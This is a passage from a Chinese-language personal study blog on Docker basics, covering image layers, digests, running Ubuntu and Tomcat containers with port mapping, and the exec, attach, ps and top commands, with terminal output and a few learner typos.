342.5kB/342.5kB</span><br><span class="line">adff97f6861e: Loading layer  10.88MB/10.88MB</span><br><span class="line">9b43d841bc28: Loading layer  42.15MB/42.15MB</span><br><span class="line">9abd5b933e89: Loading layer  3.072kB/3.072kB</span><br><span class="line">Loaded image: zookeeper:3.7</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240301200729066.png" alt="image-20240301200729066"></p><p>和之前对比一下，镜像id都是一样的，这个也有重定向的写法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker load &lt; my.tar</span><br></pre></td></tr></table></figure><p>效果是一样的</p><h2 id="镜像分层"><a href="#镜像分层" class="headerlink" title="镜像分层"></a>镜像分层</h2><p>Docker 镜像由一些<strong>松耦</strong>合的只读镜像层组成，Docker Daemon 负责堆叠这些镜像层，并将它们关联为一个统一的整体，即对外表现出的是一个独立的对象。“通过 docker pull 命令拉取指定的镜像时,每个 Pull complete 结尾的行就代表下载完毕了一个镜像层。·<br>例如，下面的 redis:latest 镜像就包含8个镜像层。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull redis</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/redis</span><br><span class="line">e1caac4eb9d2: Pull complete</span><br><span class="line">7469c6c5b625: Pull complete</span><br><span class="line">a3d1b68c4a62: Pull complete</span><br><span class="line">152cbe749752: Pull complete</span><br><span class="line">7218480dfba1: Pull complete</span><br><span class="line">e61c48a0d344: Pull complete</span><br><span class="line">4f4fb700ef54: Pull complete</span><br><span class="line">82adb0efabd8: Pull complete</span><br><span class="line">--如果存在则会显示Already exists</span><br><span class="line">Digest: sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402</span><br><span class="line">Status: Downloaded newer image for redis:latest</span><br><span class="line">docker.io/library/redis:latest</span><br></pre></td></tr></table></figure><h3 id="为什么分层"><a href="#为什么分层" class="headerlink" title="为什么分层"></a>为什么分层</h3><p>采用这种分层结构的优势很多，例如，每个分层都是只读的，所有对分层的修改都是以新分层的形式出现，并不会破坏原分层内容:再如，每个分层只记录变更内容，所以有利于节省存储空间等。”<br>不过，分层结构的最大的好处是，在不同镜像间实现<strong>资源共享</strong>，即不同镜像对相同下层镜像的复用。对于 docker pull 命令,其在拉取之前会先获取到其要拉取镜像的所有 magelD,然后在本地查找是否存在这些分层。如果存在，则不再进行拉取，而是共享本地的该分层。大大节点的存储空间与网络带宽，提升了拉取效率。</p><h3 id="镜像层构成"><a href="#镜像层构成" class="headerlink" title="镜像层构成"></a>镜像层构成</h3><p>每个镜像层由两部分构成:<strong>镜像文件系统</strong>与<strong>镜像json</strong> 文件。这两部分具有相同的 magelD.镜像文件系统就是对镜像占有的磁盘空间进行管理的文件系统,拥有该镜像所有镜像层的数据内容。而镜像 json 文件则是用于描述镜像的相关属性的集合，通过 docker inspect [镜像]就可以直观看到。“</p><h4 id="镜像文件系统构成"><a href="#镜像文件系统构成" class="headerlink" title="镜像文件系统构成"></a>镜像文件系统构成</h4><p>一个 docker 镜像的文件系统由多层只读的镜像层组成，每层都完成了特定的功能而这些只读镜像层根据其位置与功能的不同可分为两类: <strong>基础镜像层</strong>与<strong>扩展镜像层.</strong><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240302143631410.png" alt="image-20240302143631410"></p><ul><li>基础镜像层</li></ul><p>​所有镜像的最下层都具有一个可以<strong>看得到</strong>的基础镜像层 Base lmage,基础镜像层的文件系统称为根文件系统 rootfs。而 rootfs 则是建立在 Linux 系统中“<strong>看不到的</strong>”引导文件系统bootfs之上。</p><ul><li>扩展镜像层</li></ul><p>​在基础镜像层之上的镜像层称为扩展镜像层。顾名思义,其是对基础镜像层功能的扩展在 Dockerfile 中，每条指令都是用于完成某项特定功能的，而每条指令都会生成一个扩展镜像层。“</p><ul><li>容器层</li></ul><p>​一旦镜像运行了起来就形成了容器，而容器就是一个运行中的 Linux 系统，其也是具有文件系统的。容器的这个文件系统是在 docker 镜像<strong>最外层</strong>之上增加了一个<strong>可读写的容器层</strong>对文件的任何更改都只存在于容器层。因此任何对容器的操作都不会影响到镜像本身。“容器层如果需要修改某个文件，系统会从容器层开始向下一层层的查找该文件，直到找到为止。任何对于文件的操作都会记录在容器层。例如，要修改某文件，容器层会首先把在镜像层找到的文件 copy 到容器层，然后再进行修改。删除文件也只会将存在于容器层中的文件副本删除。“<br>​可以看出,Docker 容器就是一个叠加后的文件系统,而这个容器层称为 Union File System,联合文件系统。</p><h2 id="LinuxOS启动过程"><a href="#LinuxOS启动过程" class="headerlink" title="LinuxOS启动过程"></a>LinuxOS启动过程</h2><p>​现代操作系统都是 C&#x2F;S模式的微内核架构的，由两大部分构成:内核(Server)与服务模块(Client)。</p><p>​Linux的 bootfs 文件系统由两部分构成:bootloader（将kernel加载到内存，并引导kernel启动） 与kernel（启动后，内存使用权就又bootfs完全转交给kernel，然后kernel就会把bootfs卸载）。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240302163101380.png" alt="image-20240302163101380"></p><h2 id="镜像摘要"><a href="#镜像摘要" class="headerlink" title="镜像摘要"></a>镜像摘要</h2><p>每个镜像都有一个长度为64 位的16 进制字符串作为其摘要 digest。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker inspect [OPTIONS] NAME|ID [NAME|ID...]</span><br></pre></td></tr></table></figure><p>OPTIONS说明：</p><ul><li>**-f :**指定返回值的模板文件。</li><li>**-s :**显示总的文件大小。</li><li>**–type :**为指定类型返回JSON。</li></ul><p>查看摘要</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images xx --degists</span><br><span class="line">[root@localhost ~]# docker images redis --digests</span><br><span class="line">REPOSITORY   TAG       DIGEST                                                                    IMAGE ID       CREATED       SIZE</span><br><span class="line">redis        latest    sha256:e647cfe134bf5e8e74e620f66346f93418acfc240b71dd85640325cb7cd01402   d1397258b209   7 weeks ago   138MB</span><br><span class="line">​</span><br></pre></td></tr></table></figure><p>一个镜像一旦创建完毕，其 digest 就不会发生改变了，因为镜像是只读的。。<br>Docker 默认采用的 Hash 算法是 SHA256，即 Hah 值是一个长度为 256 位的二进制值。<br>Docker 使用 16 进制表示，即变为了长度为 64 位的字符串。</p><h3 id="摘要作用"><a href="#摘要作用" class="headerlink" title="摘要作用"></a>摘要作用</h3><p>​摘要的主要作用是区分相同<repository>:<tag>的不同镜像。。<br>​例如镜像 xxx:2.8 在生产运行过程中发现存在一个 BUG。现对其进行了修复，并使用原标签将其 push 回了仓库，那么原镜像被覆盖。但生产环境中遗留了大量运行中的修复前镜像的容器。此时，通过镜像标签已经无法区分镜像是修复前的还是修复后的了，因为它们的标签是相同的。此时通过查看镜像的 digest 就可以区分出修改前后版本，因为内容发生了变化，digest一定会变。”<br>​为了确保再次拉取到的是修复后的镜像，可通过 digest 进行镜像拉取。其用法是:docker pull <repository>@<digest>.</p><h3 id="分发散列值"><a href="#分发散列值" class="headerlink" title="分发散列值"></a>分发散列值</h3><p>​在 push 或 pul 镜像时，都会对镜像进行压缩以减少网络带宽和传输时长。但压缩会改变镜像内容，会导致经过网络传输后，镜像内容与其digest不相符。出现问题。<br>​为了避免该问题该问题，Docker 又为镜像配置了 Distribution Hash(分发散列值)。在镜像被压缩后立即计算分发散列值，然后使该值随压缩过的镜像一同进行发送。在接收方接收后，立即计算压缩镜像的分发散列值，再与携带的分发散列值对比。如果相同，则说明传输没有问题。</p><h2 id="容器运行的本质"><a href="#容器运行的本质" class="headerlink" title="容器运行的本质"></a>容器运行的本质</h2><p>Docker 容器存在的意义就是为了运行容器中的应用，对外提供服务，所以启动容器的目的就是启动运行该容器中的应用。容器中的应用运行完毕后，容器就会自动终止。所以，如果不想让容器启动后立即终止运行，则就需要使容器应用不能立即结束。通常采用的方式有两种，使应用处于<strong>与用户交互</strong>的状态或<strong>等待状态</strong>。.</p><h3 id="docker交互式启动ubantu"><a href="#docker交互式启动ubantu" class="headerlink" title="docker交互式启动ubantu"></a>docker交互式启动ubantu</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker pull ubuntu</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/ubuntu</span><br><span class="line">01007420e9b0: Pull complete</span><br><span class="line">Digest: sha256:f9d633ff6640178c2d0525017174a688e2c1aef28f0a0130b26bd5554491f0da</span><br><span class="line">Status: Downloaded newer image for ubuntu:latest</span><br><span class="line">docker.io/library/ubuntu:latest</span><br></pre></td></tr></table></figure><h4 id="遇到问题Error-docker-login—"><a href="#遇到问题Error-docker-login—" class="headerlink" title="遇到问题Error docker login—-"></a>遇到问题Error docker login—-</h4><p>Error response from daemon: pull access denied for ubantu, repository does not e                                                                              xist or may require ‘docker login’: denied: requested access to the resource is                                                                               denied</p><p>解决方案</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker login</span><br><span class="line">然后输入你的账号密码</span><br></pre></td></tr></table></figure><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>密码会保存在&#x2F;root&#x2F;.docker&#x2F;config.json文件下，要注意保护，加密方式是Base64，解码出来时账号:密码的格式，还是挺危险的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# echo &quot;YWRtaW46MTIzNDU2==&quot; | base64 --decode</span><br><span class="line">admin:123456 base64: invalid input</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name myubantu ubantu #--name重命名方便查询进程</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND       CREATED          STATUS                      PORTS     NAMES</span><br><span class="line">6bb10ad29613   ubuntu         &quot;/bin/bash&quot;   4 seconds ago    Exited (0) 3 seconds ago              myubuntu</span><br></pre></td></tr></table></figure><p>可以发现是退出的状态，所以我们需要加上一个bash来添加命令行，然后容器里不允许重名，所以–name 后可以加个2，</p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li>**ubuntu这是指用 ubuntu镜像为基础来启动容器。</li><li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mybantu2 -it ubuntu /bin/bash #-i是交互式命令，-t是给一个伪客户端， /bin/bash是常用shell的路径</span><br><span class="line">[root@localhost ~]# docker run --name mybuntu2 -it ubuntu /bin/bash</span><br><span class="line">root@939a1dcb875c:/# ls</span><br><span class="line">bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure><p>可以看到这就进来了，但有很多命令这个系统里是没有，然后可以按exit退出</p><p>但有时候这个&#x2F;bin&#x2F;bash也可以不加，不懂什么时候要什么时候不要</p><ul><li>原因：可以看dockerfile里的镜像层，有一个CMD[‘bash’],是作为run参数里的一个选项，没有的话默认就是bash</li></ul><h3 id="docker交互式启动tomcat"><a href="#docker交互式启动tomcat" class="headerlink" title="docker交互式启动tomcat"></a>docker交互式启动tomcat</h3><p>与ubuntu不同的是，tomcat启动时需要注意一些东西，这里就不用最新版了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.49</span><br><span class="line">[root@localhost ~]# docker run --name mytom -it tomcat:8.5.49 /bin/bash</span><br><span class="line">root@df72620e3480:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>可以发现和解压出来的一样，但tomcat是未启动，原因出在&#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom2 -it tomcat:8.5.49</span><br><span class="line">...</span><br><span class="line">Server startup in 888 ms</span><br></pre></td></tr></table></figure><p>这时候会发现tomcat启动了，用网页访问试试,还是不行，因为端口8080是centos的里某个占用这个端口的应用，但此时没有，所以不行，需要用到端口映射，把它暴露给宿主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name mytom3 -it -p 8081:8080 tomcat:8.5.49  左边是宿主机的端口，右边是容器里的端口</span><br><span class="line">第一个8081是暴露linux 的端口号，这样外部才能连接linux</span><br><span class="line">第二个端口号暴露的是容器的端口号，这样linux才能连接容器</span><br><span class="line">-P是随机分配到默认即 rand:default 因为不可控，所以不常用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是-p这个参数要放在容器左边，不然会出问题，但视频里可以访问，我的不知道为什么，虚拟机里可以访问，但自己的windows主机访问不了</p><h4 id="遇到问题网络没了"><a href="#遇到问题网络没了" class="headerlink" title="遇到问题网络没了"></a>遇到问题网络没了</h4><ul><li><a href="https://zhuanlan.zhihu.com/p/426926356">解决方法</a></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chkconfig --list --看看配置里是否有网络管理工具冲突，保留一个即可</span><br><span class="line">systemctl stop NetworkManager</span><br><span class="line">systemctl restart Network.Service</span><br></pre></td></tr></table></figure><ul><li>docker ps -a的内容太多</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -a -q) 删除所有已经停止的容器</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303135819090.png" alt="image-20240303135819090"></p><p>终于是进来了，有两种退出方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctrl + p + q容器还是up的</span><br><span class="line">ctrl + c 就直接退出了</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED         STATUS         PORTS                                       NAMES</span><br><span class="line">b162037cb017   tomcat:8.5.49   &quot;catalina.sh run&quot;   7 minutes ago   Up 7 minutes   0.0.0.0:8080-&gt;8080/tcp, :::8080-&gt;8080/tcp   tom1</span><br></pre></td></tr></table></figure><p>这里可以发现 command就不是&#x2F;bin&#x2F;bash了，俄式一个.sh文件</p><p>tips：0.0.0.0 ipv4的任意ip   ::: ipv6的任意ip</p><h3 id="守护进程方式启动tomcat"><a href="#守护进程方式启动tomcat" class="headerlink" title="守护进程方式启动tomcat"></a>守护进程方式启动tomcat</h3><p>但如果伪终端一直存在，对后续的操作并不是很方便，所以我们可以把-it参数换成-d</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name tom2 -dp 8081:8080 tomcat:8.5.49</span><br><span class="line">e37ef6eeb57e3ef728d06c3807ace699a4292266fe8b295f384a04afc4e28c93</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303141539414.png" alt="image-20240303141539414"></p><p>可以看到8081也是可以访问的，但以此方式启动ubuntu是退出状态，因为未提供可交互的平台，当我们不知道时，可以看该镜像的dockerfile，里面会告诉我们要不要写。</p><h3 id="对高版本的tomcat的访问"><a href="#对高版本的tomcat的访问" class="headerlink" title="对高版本的tomcat的访问"></a>对高版本的tomcat的访问</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull tomcat:8.5.50</span><br><span class="line">docker run --name tom3 -dp 8084:8080 tomcat:8.5.50</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303151123587.png" alt="image-20240303151123587"></p><p>服务启动了，但没找到资源，说不定是网站页面文件配置有问题，所以我们进入tomcat的文件里看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name tom4 -it tomcat:8.5.50 /bin/bash --这里就不用-p参数了，因为访问不了，只是看看配置文件</span><br><span class="line">root@48c67ba22d08:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     README.md      conf     native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  RELEASE-NOTES  include  temp</span><br><span class="line">LICENSE          RUNNING.txt    lib      webapps</span><br><span class="line">NOTICE           bin            logs     webapps.dist</span><br></pre></td></tr></table></figure><p>可以发现多了一个webapps.dist，原本应该访问webapps文件的，但资源都放在dist里，我们需要移动一下文件,因为之前启动过一个tom3，我们用新命令exec来进入改一下文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it tom3 /bin/bash</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# rm -rf webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps.dist</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# mv webapps.dist/ webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>现在webapps里面有东西，再重新访问试试，发现可以了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240303152829813.png" alt="image-20240303152829813"></p><p>对于高板本的问题，主要是webapps的目录是空的，需要移过去</p><h3 id="容器退出命令"><a href="#容器退出命令" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f $(docker ps -a)强制删除全部容器</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit </span><br><span class="line">ctrl p + q</span><br></pre></td></tr></table></figure><h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到不影响容器的状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec --help</span><br><span class="line"></span><br><span class="line">Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line"></span><br><span class="line">Execute a command in a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container exec, docker exec</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  - d, --detach               Detached mode: run command in the background  --后台运行，分离模式</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container --指定别的快捷键组合替代ctrl p q</span><br><span class="line">  -e, --env list             Set environment variables 设置环境变量</span><br><span class="line">      --env-file list        Read in a file of environment variables  文件形式配置环境变量</span><br><span class="line">  -i, --interactive          Keep STDIN open even if not attached  交互方式</span><br><span class="line">      --privileged           Give extended privileges to the command  扩展特权</span><br><span class="line">  -t, --tty    伪客户端              Allocate a pseudo-TTY</span><br><span class="line">  -u, --user string     有的容器需要身份认证     Username or UID (format: &quot;&lt;name|uid&gt;[:&lt;group|gid&gt;]&quot;)</span><br><span class="line">  -w, --workdir string       Working directory inside the container 设置工作目录</span><br></pre></td></tr></table></figure><p>基本在docker run里都有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -w /root -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:~# pwd</span><br><span class="line">/root</span><br></pre></td></tr></table></figure><p>有时候需要查看容器的ip，我们也可以不用进去，把bash换成你想执行的命令即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# docker exec -it tom pwd</span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure><h3 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h3><p>和exec类似,但对tomcat有例外，进不去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name buntu -it ubuntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# [root@localhost ~]#</span><br><span class="line">[root@localhost ~]#</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         17 seconds ago   Up 15 seconds                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   42 minutes ago   Up 42 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker attach buntu</span><br><span class="line">root@0c5e1d974b26:/# ls</span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   lib64  media   opt  root  sbin  sys  usr</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED              STATUS                     PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         About a minute ago   Exited (0) 9 seconds ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   43 minutes ago       Up 43 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到docker exec 退出后进程还在，但docker attach退出后，进程也退出了，说明exec是创建新的进程来操作，而attach是进入到本体进程去操作，退出后，就都退出了，但docker attach进不去tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach tom,只会流个光标闪烁，但此时你退出后tomcat也退出了</span><br><span class="line">[root@localhost ~]# docker attach --help</span><br><span class="line"></span><br><span class="line">Usage:  docker attach [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Attach local standard input, output, and error streams to a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container attach, docker attach</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container</span><br><span class="line">      --no-stdin             Do not attach STDIN 键盘输入不起作用，默认false</span><br><span class="line">      --sig-proxy            Proxy all received signals to the process (default true) 接收的信号代理到进程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker start buntu</span><br><span class="line">buntu</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED             STATUS                        PORTS     NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         26 minutes ago      Up 3 seconds                            buntu</span><br></pre></td></tr></table></figure><p>因为ubuntu的cmd是bash，是命令行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# cd logs</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# ls</span><br><span class="line">catalina.2024-03-03.log  host-manager.2024-03-03.log  localhost.2024-03-03.log  localhost_access_log.2024-03-03.txt  manager.2024-03-03.log</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# cat localhost_access_log.2024-03-03.txt</span><br><span class="line">192.168.174.1 - - [03/Mar/2024:09:05:56 +0000] &quot;GET / HTTP/1.1&quot; 200 11215</span><br></pre></td></tr></table></figure><p>在tomcat中启停日志的信息会保存到catalina.—.log，访问时这个文件不会变，只有启动关闭时才会变化，然后其中一个参数catalina.sh和下面这个命令差不多</p><p><strong>tail -f filename</strong> 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p><p><strong>命令格式：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail [参数] [文件]  </span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>-f 循环读取</li><li>-q 不显示处理信息</li><li>-v 显示详细的处理信息</li><li>-c&lt;数目&gt; 显示的字节数</li><li>-n&lt;行数&gt; 显示文件的尾部 n 行内容</li><li>–pid&#x3D;PID 与-f合用,表示在进程ID,PID死掉之后结束</li><li>-q, –quiet, –silent 从不输出给出文件名的首部</li><li>-s, –sleep-interval&#x3D;S 与-f合用,表示在每次反复的间隔休眠S秒</li></ul><p><strong>实例</strong></p><p>要显示 notes.log 文件的最后 10 行，请输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail notes.log         # 默认显示最后 10 行</span><br></pre></td></tr></table></figure><h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps --help</span><br><span class="line">Usage:  docker ps [OPTIONS]</span><br><span class="line">List containers</span><br><span class="line">Aliases:</span><br><span class="line">  docker container ls, docker container list, docker container ps, docker ps</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all containers (default shows just running)</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided 过滤条件</span><br><span class="line">      --format string   Format output using a custom template: 格式化输出</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format with</span><br><span class="line">                        column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format using</span><br><span class="line">                        the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given Go</span><br><span class="line">                        template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/ for more</span><br><span class="line">                        information about formatting output with templates</span><br><span class="line">  -n, --last int        Show n last created containers (includes all states)</span><br><span class="line">                        (default -1) 显示n个容器</span><br><span class="line">  -l, --latest          Show the latest created container (includes all states) 显示最后一个创建的容器</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output  完整显示输出</span><br><span class="line">  -q, --quiet           Only display container IDs</span><br><span class="line">  -s, --size            Display total file sizes</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="docker-top"><a href="#docker-top" class="headerlink" title="docker top"></a>docker top</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps 默认显示正在运行的容器</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS             PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS                   PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         6 hours ago   Exited (0) 5 hours ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour         0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker top tom</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                14342               14323               0                   20:37               pts/0               00:00:07            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties 